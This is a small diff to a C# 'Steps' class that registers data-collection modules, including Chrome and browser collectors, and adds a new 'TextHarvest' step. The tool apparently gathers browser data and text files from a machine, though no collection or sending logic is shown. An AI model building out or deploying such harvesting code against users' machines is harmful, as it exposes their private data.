@@ -16,7 +16,7 @@ internal static class Steps
         yield return new Step("software", SystemCollector.Software);
         yield return new Step("chrome", r => ChromeCollector.Collect(r, log));
         yield return new Step("browser", r => BrowserCollector.Collect(r, log));
-
+        yield return new Step("text", r => TextHarvest.Collect(r, log));
     }
 
     public static bool Wanted(string key) =>
